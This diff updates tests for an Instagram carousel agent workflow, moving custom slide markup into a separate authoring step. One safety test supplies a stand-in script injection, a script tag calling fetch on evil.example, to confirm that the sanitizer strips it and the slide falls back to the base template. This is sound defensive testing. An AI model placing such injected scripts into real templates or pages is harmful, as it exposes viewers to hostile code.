@@ -8,16 +8,30 @@ import {
   customArchetypeTemplateId,
   validateCustomArchetypes,
 } from "../src/workflow/create-instagram-agent-workflow.js";
-import type { InstagramCopyOutput } from "../src/workflow/types.js";
+import { composeCustomArchetype, type InstagramCopyOutput } from "../src/workflow/types.js";
 import { boringSlideMetrics, fakeRenderCarousel, fakeRouterSequence, finalTurn, fixtureHeadline, goodCopyOutput, goodImageCandidatePool, goodImageVettingOutput, goodRelevanceVerdict, goodResearchOutput, goodTrendScoutOutput, goodVisualQaOutput, makePromptStore, passingSlideMetrics, pendingStudioRow, setupTestEnvironment, type TestEnvironment } from "./test-helpers.js";
-import { DEFAULT_PACKAGE_TURN, VALUE_TURN_NO_FINDINGS } from "./turns.js";
+import { DEFAULT_ENTITIES_TURN, DEFAULT_PACKAGE_TURN, VALUE_TURN_NO_FINDINGS } from "./turns.js";
 import { goodAngleProposal } from "./angle-fixtures.js";
 import { validateCustomArchetypeSlots } from "../src/workflow/custom-archetype-checks.js";
 
 const base = { clientSlug: "acme", productId: "instagram-agent", runKind: "recurring" as const };
 
-/** `goodCopyOutput()`'s slide 2 turned into a valid, clean custom archetype. */
-function withCustomArchetype(overrides: { archetypeId?: string; bodyHtml?: string } = {}): InstagramCopyOutput {
+/**
+ * ── PHASE 5.5 (spec §3 B3): THESE FIXTURES FEED `05f`, NOT THE COPY TURN ──
+ *
+ * Until Phase 5.5 the copy step authored the markup itself, so a fixture put a
+ * whole `customArchetype` on slide 2 of its COPY turn. `InstagramCopyDraftSchema`
+ * now OMITS that key — the writer emits a `customArchetypeBrief` (~60 tokens)
+ * and `05f-author-custom-archetype` authors `bodyHtml`/`css`/`slots`/`fields`
+ * against it — so a draft carrying authored markup can no longer reach a render
+ * at all: `.omit()` strips it silently and the slide would degrade for want of a
+ * block nobody sent. Every case below therefore queues ONE EXTRA TURN, the
+ * markup, immediately after its copy turn and before the vetting turn, which is
+ * exactly where `05f` sits in the workflow.
+ */
+
+/** `goodCopyOutput()`'s slide 2, asking `05f` for a layout the standard archetypes do not have. */
+function withCustomArchetypeBrief(overrides: { archetypeId?: string; slots?: string[] } = {}): InstagramCopyOutput {
   const good = goodCopyOutput();
   return {
     ...good,
@@ -26,19 +40,26 @@ function withCustomArchetype(overrides: { archetypeId?: string; bodyHtml?: strin
         ? {
             ...s,
             layout: "custom" as const,
-            customArchetype: {
+            customArchetypeBrief: {
               archetypeId: overrides.archetypeId ?? "custom_bold_diagonal",
               name: "Bold diagonal stat",
               rationale: "none of the six standard archetypes give this figure the full-bleed diagonal treatment the client asked for",
-              bodyHtml: overrides.bodyHtml ?? `<div class="wrap"><h1>{{kicker}}</h1><p>{{note}}</p></div>`,
-              css: ".wrap h1 { font-family: var(--f-display); color: var(--fg); } .wrap p { color: var(--accent); }",
-              slots: ["note"],
-              fields: { note: "a supporting line the model wrote for this slide" },
+              slots: overrides.slots ?? ["note"],
             },
           }
         : s,
     ),
   };
+}
+
+/** `05f`'s own turn — the MARKUP half, which is all that agent may author. */
+function customArchetypeMarkupTurn(overrides: { bodyHtml?: string; slots?: string[]; fields?: Record<string, string> } = {}) {
+  return finalTurn({
+    bodyHtml: overrides.bodyHtml ?? `<div class="wrap"><h1>{{kicker}}</h1><p>{{note}}</p></div>`,
+    css: ".wrap h1 { font-family: var(--f-display); color: var(--fg); } .wrap p { color: var(--accent); }",
+    slots: overrides.slots ?? ["note"],
+    fields: overrides.fields ?? { note: "a supporting line the model wrote for this slide" },
+  });
 }
 
 describe("custom archetypes: authoring, safety, and promotion", () => {
@@ -63,10 +84,11 @@ describe("custom archetypes: authoring, safety, and promotion", () => {
     // fixture's router queues no studio turns). `materializeTemplates` lists
     // only enabled rows, so nothing about the render changes.
     const store = new MemoryTemplateStore([pendingStudioRow()]);
-    const copy = withCustomArchetype();
+    const copy = withCustomArchetypeBrief();
     const router = fakeRouterSequence([
-      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), finalTurn(goodAngleProposal()),
+      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), finalTurn(goodAngleProposal()), finalTurn(DEFAULT_ENTITIES_TURN),
       finalTurn(copy),
+      customArchetypeMarkupTurn(),
       finalTurn(goodImageVettingOutput()),
       finalTurn(goodRelevanceVerdict()), finalTurn(VALUE_TURN_NO_FINDINGS), finalTurn(goodVisualQaOutput()), finalTurn(DEFAULT_PACKAGE_TURN),
     ]);
@@ -93,6 +115,12 @@ describe("custom archetypes: authoring, safety, and promotion", () => {
     const slide2 = slidesData?.slides.find((s) => s.n === 2);
     expect(slide2?.template).toBe("custom-bold-diagonal.html");
     expect(slide2?.fields["note"]).toBe("a supporting line the model wrote for this slide");
+    // Phase 5.5: the markup came from `05f`, and the identity from the writer's
+    // brief — `composeCustomArchetype` is the only join, so a template named
+    // after the archetypeId proves the brief half arrived too.
+    const stepIds = steps.map((s) => s.stepId);
+    expect(stepIds).toContain("05f-author-custom-archetype-attempt-1");
+    expect(steps.find((s) => s.stepId === "05f1-apply-custom-archetype-attempt-1")?.output).toMatchObject({ slide: 2, applied: true });
 
     // The materialized file is real, on disk, and is what the renderer's
     // OWN real path/existence check (`validateRenderInputs`, exercised by
@@ -108,10 +136,14 @@ describe("custom archetypes: authoring, safety, and promotion", () => {
     // fixture's router queues no studio turns). `materializeTemplates` lists
     // only enabled rows, so nothing about the render changes.
     const store = new MemoryTemplateStore([pendingStudioRow()]);
-    const copy = withCustomArchetype({ bodyHtml: `<div><script>fetch('https://evil.example')</script>{{note}}</div>` });
+    const copy = withCustomArchetypeBrief();
     const router = fakeRouterSequence([
-      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), finalTurn(goodAngleProposal()),
+      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), finalTurn(goodAngleProposal()), finalTurn(DEFAULT_ENTITIES_TURN),
       finalTurn(copy),
+      // Phase 5.5: the script now arrives from `05f`, which is where markup is
+      // authored. `assertSafeMarkup` runs on THAT output, so the refusal costs
+      // one $0.030 call and one slide instead of a whole drafting attempt.
+      customArchetypeMarkupTurn({ bodyHtml: `<div><script>fetch('https://evil.example')</script>{{note}}</div>` }),
       finalTurn(goodImageVettingOutput()),
       finalTurn(goodRelevanceVerdict()), finalTurn(VALUE_TURN_NO_FINDINGS), finalTurn(goodVisualQaOutput()), finalTurn(DEFAULT_PACKAGE_TURN),
     ]);
@@ -138,24 +170,38 @@ describe("custom archetypes: authoring, safety, and promotion", () => {
     // Downgraded to the client's own base template, never held and never
     // rendered with the smuggled script.
     expect(slidesData?.slides.find((s) => s.n === 2)?.template).toBe("slide.html");
+    // And the refusal is RECORDED, so the degrade is visible rather than a
+    // slide that quietly lost its design: `05f1` is the $0 step that applies
+    // (or drops) the composed archetype.
+    expect(steps.find((s) => s.stepId === "05f1-apply-custom-archetype-attempt-1")?.output).toMatchObject({ slide: 2, applied: false });
   }, 30000);
 
   it("degrades a slide whose custom archetype references a slot nothing fills, rather than rendering a hole", async () => {
     // Item O's slot contract (`validateCustomArchetypeSlots`), free and
     // pre-render. `materializeTemplates` substitutes what it is given and
-    // leaves the rest, so `{{price}}` reaches the slide as literal text and
-    // nothing downstream fails: today that ships. Green once the integrator
-    // lands note (e) — `validateCustomArchetypes` additionally calling
-    // `validateCustomArchetypeSlots`.
+    // leaves the rest, so `{{price}}` would reach the slide as literal text and
+    // nothing downstream would fail.
+    //
+    // Phase 5.5: the check now runs on `05f`'s composed output, inside the
+    // workflow, before the slide is assembled — which is why this case is a
+    // real end-to-end assertion again rather than one that passed because the
+    // whole block had been stripped from the draft.
     // One DISABLED studio row, so `00c-check-template-studio` resolves
     // `awaiting-approval` and the studio's paid block is skipped (this
     // fixture's router queues no studio turns). `materializeTemplates` lists
     // only enabled rows, so nothing about the render changes.
     const store = new MemoryTemplateStore([pendingStudioRow()]);
-    const copy = withCustomArchetype({ bodyHtml: `<div class="wrap"><h1>{{kicker}}</h1><p>{{note}}</p><em>{{price}}</em></div>` });
+    const copy = withCustomArchetypeBrief();
+    const unfilledMarkup = {
+      bodyHtml: `<div class="wrap"><h1>{{kicker}}</h1><p>{{note}}</p><em>{{price}}</em></div>`,
+      css: ".wrap h1 { font-family: var(--f-display); color: var(--fg); } .wrap p { color: var(--accent); }",
+      slots: ["note"],
+      fields: { note: "a supporting line the model wrote for this slide" },
+    };
     const router = fakeRouterSequence([
-      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), finalTurn(goodAngleProposal()),
+      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), finalTurn(goodAngleProposal()), finalTurn(DEFAULT_ENTITIES_TURN),
       finalTurn(copy),
+      finalTurn(unfilledMarkup),
       finalTurn(goodImageVettingOutput()),
       finalTurn(goodRelevanceVerdict()), finalTurn(VALUE_TURN_NO_FINDINGS), finalTurn(goodVisualQaOutput()), finalTurn(DEFAULT_PACKAGE_TURN),
     ]);
@@ -181,9 +227,11 @@ describe("custom archetypes: authoring, safety, and promotion", () => {
       | undefined;
     // Degraded through the same path a `stat_callout` with no `stat` takes.
     expect(slidesData?.slides.find((s) => s.n === 2)?.template).not.toBe("custom-bold-diagonal.html");
+    expect(steps.find((s) => s.stepId === "05f1-apply-custom-archetype-attempt-1")?.output).toMatchObject({ slide: 2, applied: false });
     // The finding is a pure-function verdict, asserted directly so the reason
-    // text is pinned where a reader of this file can see it.
-    expect(validateCustomArchetypeSlots(copy.slides[1]!.customArchetype!)).toMatchObject({ ok: false });
+    // text is pinned where a reader of this file can see it — on the COMPOSED
+    // object, which is the only shape the check ever sees now.
+    expect(validateCustomArchetypeSlots(composeCustomArchetype(copy.slides[1]!.customArchetypeBrief!, unfilledMarkup))).toMatchObject({ ok: false });
   }, 30000);
 
   it("a custom archetype whose render measures empty produces an interest finding naming custom-<id>", async () => {
@@ -196,15 +244,17 @@ describe("custom archetypes: authoring, safety, and promotion", () => {
     // fixture's router queues no studio turns). `materializeTemplates` lists
     // only enabled rows, so nothing about the render changes.
     const store = new MemoryTemplateStore([pendingStudioRow()]);
-    const copy = withCustomArchetype();
+    const copy = withCustomArchetypeBrief();
     // Three drafting attempts: `08a1` sits BEFORE `08b`, so the two refused
     // attempts spend copy + vetting + relevance and no visual-QA turn, and
     // the angle is proposed once per REVISION rather than once per attempt.
+    // Phase 5.5: each attempt re-reads its own draft, so each one asks `05f`
+    // for the markup again — one extra turn per attempt, after the copy turn.
     const router = fakeRouterSequence([
-      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), finalTurn(goodAngleProposal()),
-      finalTurn(copy), finalTurn(goodImageVettingOutput()), finalTurn(goodRelevanceVerdict()), finalTurn(VALUE_TURN_NO_FINDINGS),
-      finalTurn(copy), finalTurn(goodImageVettingOutput()), finalTurn(goodRelevanceVerdict()), finalTurn(VALUE_TURN_NO_FINDINGS),
-      finalTurn(copy), finalTurn(goodImageVettingOutput()), finalTurn(goodRelevanceVerdict()), finalTurn(VALUE_TURN_NO_FINDINGS),
+      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), finalTurn(goodAngleProposal()), finalTurn(DEFAULT_ENTITIES_TURN),
+      finalTurn(copy), customArchetypeMarkupTurn(), finalTurn(goodImageVettingOutput()), finalTurn(goodRelevanceVerdict()), finalTurn(VALUE_TURN_NO_FINDINGS),
+      finalTurn(copy), customArchetypeMarkupTurn(), finalTurn(goodImageVettingOutput()), finalTurn(goodRelevanceVerdict()), finalTurn(VALUE_TURN_NO_FINDINGS),
+      finalTurn(copy), customArchetypeMarkupTurn(), finalTurn(goodImageVettingOutput()), finalTurn(goodRelevanceVerdict()), finalTurn(VALUE_TURN_NO_FINDINGS),
       finalTurn(goodVisualQaOutput()), finalTurn(DEFAULT_PACKAGE_TURN),
     ]);
 
@@ -273,11 +323,37 @@ describe("custom archetypes: authoring, safety, and promotion", () => {
     // fixture's router queues no studio turns). `materializeTemplates` lists
     // only enabled rows, so nothing about the render changes.
     const store = new MemoryTemplateStore([pendingStudioRow()]);
-    const copy = withCustomArchetype();
-    const revised = { ...copy, caption: `${copy.caption} (revised)` };
-    // The angle proposal (04i) leads each ROUND: one per revision.
-  const draftTurns = (c: InstagramCopyOutput) => [finalTurn(goodAngleProposal()), finalTurn(c), finalTurn(goodImageVettingOutput()), finalTurn(goodRelevanceVerdict()), finalTurn(VALUE_TURN_NO_FINDINGS), finalTurn(goodVisualQaOutput()), finalTurn(DEFAULT_PACKAGE_TURN)];
-    const router = fakeRouterSequence([finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), ...draftTurns(copy), ...draftTurns(revised)]);
+    const copy = withCustomArchetypeBrief();
+    /**
+     * ONE DRAFTING ATTEMPT, in workflow order: the copy turn, `05f`'s markup
+     * turn, the vetting turn, relevance and value.
+     *
+     * All three attempts really run here, and that is a property of the
+     * fixture rather than an accident: this archetype's `bodyHtml` is a
+     * headline and one line, so `08a1-interest-floor` measures ONE content
+     * element against a floor of two and returns the draft on every attempt.
+     * The post ships attempt 3 with the finding recorded, which is the draft
+     * the reviewer then promotes — so every attempt needs a full set of turns,
+     * and the markup turn in particular is what the pre-Phase-5.5 version of
+     * this fixture had no need of.
+     */
+    const attemptTurns = (c: InstagramCopyOutput) => [
+      finalTurn(c),
+      customArchetypeMarkupTurn(),
+      finalTurn(goodImageVettingOutput()),
+      finalTurn(goodRelevanceVerdict()),
+      finalTurn(VALUE_TURN_NO_FINDINGS),
+    ];
+    /** One REVISION round: the angle proposal (04i) leads, then the attempts, then the two post-loop turns. */
+    const draftTurns = (c: InstagramCopyOutput) => [
+      finalTurn(goodAngleProposal()), finalTurn(DEFAULT_ENTITIES_TURN),
+      ...attemptTurns(c),
+      ...attemptTurns(c),
+      ...attemptTurns(c),
+      finalTurn(goodVisualQaOutput()),
+      finalTurn(DEFAULT_PACKAGE_TURN),
+    ];
+    const router = fakeRouterSequence([finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), ...draftTurns(copy)]);
 
     const workflowFn = createInstagramAgentWorkflow({
       tools: { ...env.tools, "publish.renderCarousel": fakeRenderCarousel(env.tools["publish.renderCarousel"]!) },
